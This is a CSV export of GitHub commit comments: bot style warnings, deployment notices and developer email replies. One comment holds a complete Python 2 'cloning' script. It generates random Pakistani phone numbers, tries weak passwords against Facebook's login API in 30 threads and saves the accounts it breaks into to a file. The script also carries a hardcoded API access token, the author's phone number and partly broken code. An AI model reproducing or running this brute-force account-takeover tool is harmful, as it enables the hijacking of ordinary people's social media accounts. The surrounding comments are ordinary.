actor_id,type,body
58020879,CommitCommentEvent,Comment3
6939032,CommitCommentEvent,"<!-- PMABOT:TAB -->
This commit is using tab character for indentation instead of spaces, what is mandated by phpMyAdmin. Please check our [Developer guidelines](http://wiki.phpmyadmin.net/pma/Developer_guidelines#Indentation) for more information.

Offending files: test/classes/config/PageSettingsTest.php, test/classes/engines/BdbTest.php, test/classes/engines/BinlogTest.php, test/classes/engines/InnodbTest.php, test/classes/engines/MemoryTest.php, test/classes/engines/Mrg_MyisamTest.php, test/classes/engines/MyisamTest.php, test/classes/engines/NdbclusterTest.php, test/classes/engines/PbxtTest.php"
6939032,CommitCommentEvent,"<!-- PMABOT:TAB -->
This commit is using tab character for indentation instead of spaces, what is mandated by phpMyAdmin. Please check our [Developer guidelines](http://wiki.phpmyadmin.net/pma/Developer_guidelines#Indentation) for more information.

Offending files: test/libraries/database_interface_test.php"
6939032,CommitCommentEvent,"<!-- PMABOT:SOB -->
This commit is missing Signed-Off-By line to indicate that you agree with phpMyAdmin Developer's Certificate of Origin. Please check [contributing documentation](https://github.com/phpmyadmin/phpmyadmin/blob/master/CONTRIBUTING.md) for more information."
6939032,CommitCommentEvent,"<!-- PMABOT:SOB --><!-- PMABOT:SOB:INVALID -->
This commit has an invalid Signed-Off-By line, please use your full name for legal compliance reasons.
Please check [Developer's Certificate of Origin](https://github.com/phpmyadmin/phpmyadmin/blob/master/DCO)
Here is a valid example: `Signed-off-by: Jane Smith <jane.smith@example.org>`"
6939032,CommitCommentEvent,"<!-- PMABOT:SPACE -->
This commit contains trailing whitespace, what is prohibited in phpMyAdmin. Please check our [Developer guidelines](https://github.com/phpmyadmin/phpmyadmin/wiki/Developer_guidelines#Indentation) for more information.

Offending files: libraries/classes/Database/Designer.php"
73116608,CommitCommentEvent,"<!-- COMMIT COMMENT NOTIFICATION -->
### Review

- [openjdk/jdk/9341](https://git.openjdk.org/jdk/pull/9341)"
68531283,CommitCommentEvent,"# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print(""\r\x1b[1;93mPlease Wait \x1b[1;91m""+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = ""\033[31mNot Vuln""
vuln = ""\033[32mVuln""

os.system(""clear"")
print  """"""


\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝


\033[1;97m
_________________________.s$$_____________s$
________________________s$$$’____________s$$
______________________.s$$$³´_______,___s$$³
_____________________s$$$$³______.s$’___$$³
________________,____$$$$$.______s$³____³$
________________$___$$$$$$s_____s$³_____³,
_______________s$___‘³$$$$$$s___$$$
_______________$$____³$$$$$$s.__³$$s
_______________³$.____³$$$$$$$s_.s$$$____s´
_______________`$$.____³$$$$$$$_$$$$___s³
________________³$$s____³$$$$$$s$$$³__s$’
_________________³$$s____$$$$$s$$$$’__s$$
_____________`s.__$$$$___s$$$$$$$$³_.s$$³__s
______________$$_s$$$$..s$$$$$$$$$$$$$$³__s$
______________s$.s$$$$s$$$$$$$$$$$$$$$$_s$$
_____________s$$$$$$$$$$$$$$$$$$$$$$$$$$$³
____________s$$$ssss$$$$$$$$$$$$$ssss$$$$$´
___________$$s§§§§§§§§§s$$$$$$s§§§§§§§§s$,
___________³§§§§§§§§§§§§§s$s§§§§§§§§§§§§s
___________§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
___________³§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
____________³§§§§§§§§§§§§§§§§§§§§§§§§§§§³
_____________³§§§§§§§§§§§§§§§§§§§§§§§§§³
______________³§§§§§§§§§§§§§§§§§§§§§§§³
________________³§§§§§§§§§§§§§§§§§§§³
__________________³§§§§§§§§§§§§§§§³
____________________³§§§§§§§§§§§³
_______________________³§§§§§³
_________________________³§³



\033[1;96m---------------------SOMI---------------------
action()
                
  033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯
             
                
\033[1;96m--------------------SOMI----------------------
""""""

####Logo####

logo1 = """"""
action()
    

\033[1;93m██████╗░██████╗░░█████╗░██████╗░
\033[1;93m██╔══██╗██╔══██╗██╔══██╗██╔══██╗
\033[1;96m██████╦╝██████╔╝███████║██║░░██║
\033[1;93m██╔══██╗██╔══██╗██╔══██║██║░░██║
\033[1;96m██████╦╝██║░░██║██║░░██║██████╔╝
\033[1;91m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░

\033[1;96m------------------SIDRA----------------------
action()
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯


\033[1;96m-----------------SOMi------------------------
""""""
logo2 = """"""
action()
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
   \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮																		
   \033[1;96m  ┃ ●  ══            ┃             ┃             ● ══ ┃ 																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
   \033[1;96m  ┃███████┃             ┃███████┃																		
 \033[1;96m    ┃███████┃\033[1;91m>>PakStar >>\033[1;96m┃███████┃																		
\033[1;96m     ┃███████┃             ┃███████┃																		   \033[1;96m     ┃███████┃             ┃███████┃																		
 \033[1;96m    ┃███████┃             ┃███████┃																	
 \033[1;96m    ┃███████┃             ┃███████┃																		
  \033[1;96m   ┃   ○                   ┃             ┃           ○            ┃																		
   \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯
 
\033[1;92mWHATAPP 03455453538
                
                


\033[1;96m---------------------SOMI--------------------
action()
    
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯

\033[1;95mSpeed Commands Country codeðŸ”¹
\033[1;91mWhataap number
\033[1;92_03455453538
                                                
\033[1;96m---------------------SOMI--------------------
""""

CorrectUsername = ""Somi""
CorrectPassword = ""Awan""

loop = 'true'
while (loop == 'true'):
    username = raw_input(""\033[1;97mðŸ“‹ \x1b[1;91mTool Username \x1b[1;97mÂ»Â» \x1b[1;97m"")
    if (username == CorrectUsername):
    	password = raw_input(""\033[1;97mðŸ— \x1b[1;91mTool Password  \x1b[1;97mÂ»Â» \x1b[1;97m"")
        if (password == CorrectPassword):
            print ""Logged in successfully as "" + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print ""\033[1;94mWrong Password""
            os.system('xdg-open https://m.facebook.comSOMIMISICAN.com')
    else:
        print ""\033[1;94mWrong Username""
        os.system('xdg-open https://m.facebook.comSOMIMUSICAN.com')


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo
    print ""\033[1;95m[1]\x1b[1;92mSTART CLONING PRESS 1( \033[1;95m NEW UPDATE )""
    time.sleep(0.05)
    print '\x1b[1;94m[3]\033[1;91m Exit ( press 2)'
    pilih_login()

def pilih_login():
    peak = raw_input(""\n\033[1;95mCHOOSE: \033[1;93m"")
    if peak =="""":
        print ""\x1b[1;97mFill In Correctly""
        pilih_login()
    elif peak ==""1"":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[1]  START CLONING With SOMI'
    time.sleep(0.10)
    print '\x1b[1;94m[2] SOMI FB ACCOUNT'
    time.sleep(0.10)
    print '\x1b[1;95m[3] MORE INFO'
    time.sleep(0.10)
    print '\x1b[1;96m[4] TRACKER'
    time.sleep(0.10)
    print '\x1b[1;97m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;91m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak ==""1"":              
        os.system(""clear"")
        print logo2
        print ""Enter any Pakistan Mobile code Number""+'\n'
        print 'Enter any code 1 to 49'
        try:
            c = raw_input(""\033[1;97mCHOOSE : "")
            k=""03""
            idlist = ('.txt')
            for line in open(idlist,""r"").readlines():
                id.append(line.strip())
        except IOError:
            print (""[!] File Not Found"")
            raw_input(""\n[ Back ]"")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬10%')
    jalan(""\033[1;96m▬▬20%"")
    jalan('\033[1;96m▬▬▬30%')
    jalan('\033[1;96m▬▬▬▬40%')
    jalan(""\033[1;96m▬▬▬▬▬50%"")
    jalan(""\033[1;96m▬▬▬▬▬▬60%    \033[1;91mPAKISTAN Country ID Clone"")
    jalan('\033[1;96m▬▬▬▬▬▬▬70%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬80%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬▬90%')
    jalan('\033[1;96m▬▬▬▬▬▬▬▬▬100%')
    jalan ('\033[1;96m Total ids number: '+xxx)
    jalan ('\033[1;95mCode you choose: '+c)
    jalan (""\033[1;94mWait A While Start Cracking..."")
    jalan (""\033[1;93mTo Stop Process Press Ctrl+z"")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(7Days) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Done)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3=""Pakistan123""
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4=""Pakistan""
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5=""786786""
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan(""Note : Your Offline account Will Open after 10 to 20 days"")
    print ''
    print """"""
    ███
──────────███║║║║║║║███
─────────█║║║║║║║║║║║║║█
────────█║║║║███████║║║║█
───────█║║║║██─────██║║║║█
──────█║║║║██───────██║║║║█
─────█║║║║██─────────██║║║║█
─────█║║║██───────────██║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
────███████───────────███████
───██║║║║║║██────────██║║║║║██
──██║║║║║║║║██──────██║║║║║║║██
─██║║║║║║║║║║██───██║║║║║║║║║║██
██║║║║║║║║║║║║█████║║║║║║║║║║║║██
█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
█║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
──██║║║║║║║║║║█░░░█║║║║║║║║║║██
───██║║║║║║║║║█░░░█║║║║║║║║║██
────██║║║║║║║║█████║║║║║║║║██
─────██║║║║║║║║███║║║║║║║║██
──────██║║║║║║║║║║║║║║║║║██
───────██║║║║║║║║║║║║║║║██
────────██║║║║║║║║║║║║║██
─────────██║║║║║║║║║║║██
──────────██║║║║║║║║║██
───────────██║║║║║║║██
────────────██║║║║║██
─────────────██║║║██
──────────────██║██
───────────────███
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g""""""

    
    raw_input(""\n\033[1;92m[\033[1;92mBack\033[1;95m]"")
    login() 
          
if __name__ == '__main__':
    login()

"
68531283,CommitCommentEvent,**_****_**
30273922,CommitCommentEvent,"Verdaccio builds:
      [CRA Test App](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/build/index.html)
      [NextJS Test App](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/next/index.html)
      [CRA Test App Size](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/build-stats.txt)
      [NextJS App Size](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/next-build-stats.txt)
      [Publish stats](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/publish.json)
      [Size diff since last release](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/publish-stats/size-diff.txt)
      [Docs](https://reactspectrum.blob.core.windows.net/reactspectrum/c098950776b8291c0b319d778f25ff1d4663ab84/verdaccio/docs/index.html)"
4502793,CommitCommentEvent,"No problem :)

--
Brian Chan
Chief Software Architect
Liferay, Inc.
Enterprise. Open Source. For Life.
(626) 806-1190

On Tue, Oct 20, 2015 at 1:39 PM, Jim Hinkey <notifications@github.com>
wrote:

> @brianchandotcom <https://github.com/brianchandotcom> - I forgot to push
> my Regen commit to origin with Cody's commits. Sorry about that. And thanks
> for doing the regen. - Jim
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/liferay/liferay-portal/commit/74d18bc3aa6aaa2f9ed67dbc37043f80d44f5b89#commitcomment-13885771>
> .
>
"
4502793,CommitCommentEvent,"No problem ! We're a team.


> On Mar 11, 2015, at 8:53 AM, Ivan Zaera <notifications@github.com> wrote:
> 
> Oh. And.. Thanks ;-)
> 
> —
> Reply to this email directly or view it on GitHub.
> 
"
8129835,CommitCommentEvent,this is great - very happy to get rid of that 'npm install -g npm' line for every version of node.  thanks!
4193587,CommitCommentEvent,"On 02/07/2015 21:55, jungle-boogie wrote:
>
> great to see openntpd included!
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/pcbsd/pcbsd/commit/4f27f94f9b06da9e04c026bff1d004036308718f#commitcomment-9639243>.
>

Yep, just added the config and options to have it enabled by default.
Should go out in next EDGE package set.

-- 
Kris Moore
PC-BSD Software
iXsystems

"
4193587,CommitCommentEvent,"On 02/18/2015 15:59, Bernard Spil wrote:
>
> Kris,
>
> It's NOT you... Fails for me as well when building with poudriere on a
> 10.0 amd64 jail... Will dig further tomorrow :D 10.1 jail is OK.
>
> Those 2 lines is all it takes to use LibreSSL
>
> Cheers! Bernard.
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/pcbsd/freebsd-ports/commit/e44b4fcd0bbd168ce87ae010170f704d6bb92dc2#commitcomment-9808528>.
>

Bernard,

Good to hear! I thought it was some obvious switch I missed. Perhaps
there is something in the 10.0 base make options I need update?

Let me know if you find it, and I'll be happy to give it another run
though.

-- 
Kris Moore
PC-BSD Software
iXsystems

"
4193587,CommitCommentEvent,"
Yea, I've fixed it in source now. After so many years of typing our
project names in all upper (PC-BSD) I tend to do all the time now :)


On Sun, 1 Mar 2015, Christian Sturm wrote:

> 
> Small nitpick: The official name is Tor, not TOR.
> 
> —
> Reply to this email directly or view it on GitHub.[AD_9MzEgHd2acjECvQfGYfrNCIRgo24Gks5nwzcjgaJpZM4Dnszj.gif]
> 
> 
>"
4193587,CommitCommentEvent,"On 03/15/2015 10:28, TheDharc wrote:
>
> why not in /boot/loader.conf ?
>
> —
> Reply to this email directly or view it on GitHub
> <https://github.com/pcbsd/pcbsd/commit/64e0719b8d3d4a0520231eb821aa05bab2dede66#commitcomment-10203056>.
>

We try to only load things we need for mountroot or have to be loaded
with kernel in there. Its faster during the bootup to use kld_list in
rc.conf, since it can load the modules at full disk/drive speed. (Loader
runs at slower speeds)

-- 
Kris Moore
PC-BSD Software
iXsystems

"
35613825,CommitCommentEvent,"Successfully deployed to the following URLs:

## sandex – ./

[sandex.vercel.app](https://sandex.vercel.app)  
[sandex-tikaro.vercel.app](https://sandex-tikaro.vercel.app)  
[sandex.me](https://sandex.me)  
[www.sandex.me](https://www.sandex.me)  
[sandex-git-main-tikaro.vercel.app](https://sandex-git-main-tikaro.vercel.app)"
35613825,CommitCommentEvent,"Successfully deployed to the following URLs:

## masstransit-documentation – ./

[masstransit-documentation.vercel.app](https://masstransit-documentation.vercel.app)  
[masstransit-documentation-git-docus-masstransit.vercel.app](https://masstransit-documentation-git-docus-masstransit.vercel.app)  
[masstransit.io](https://masstransit.io)  
[masstransit-documentation-masstransit.vercel.app](https://masstransit-documentation-masstransit.vercel.app)"
35613825,CommitCommentEvent,"Successfully deployed to the following URLs:

## lyonjs-github-com-rgln – ./

[lyonjs-github-com-rgln-git-master-lyonjs.vercel.app](https://lyonjs-github-com-rgln-git-master-lyonjs.vercel.app)  
[lyonjs-github-com-rgln.vercel.app](https://lyonjs-github-com-rgln.vercel.app)  
[lyonjs-github-com-rgln-lyonjs.vercel.app](https://lyonjs-github-com-rgln-lyonjs.vercel.app)"
